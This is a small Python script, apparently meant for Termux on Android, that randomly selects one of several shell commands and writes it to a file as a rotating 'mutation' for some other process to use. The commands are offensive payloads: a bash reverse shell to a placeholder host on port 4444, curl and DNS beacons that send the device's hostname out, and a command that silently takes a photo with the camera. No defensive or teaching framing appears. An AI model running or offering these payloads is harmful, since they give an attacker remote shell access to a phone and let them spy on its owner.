#!/usr/bin/env python3
import random
import time
mutations = [
    "curl -s http://__CALLER__/beacon.png > /dev/null",
    "bash -i >& /dev/tcp/__CALLER__/4444 0>&1",
    "curl http://__CALLER__/qr_ping?src=$(hostname)",
    "termux-camera-photo -c 0 /sdcard/cam_$(date +%s).jpg",
    "nslookup $(hostname).ping.__CALLER__.com"
]
chosen = random.choice(mutations)
with open("/data/data/com.termux/files/usr/tmp/current_mutation.txt", "w") as f:
    f.write(chosen)
print(f"[+] Mutation rotated to:\n{chosen}")
time.sleep(1)
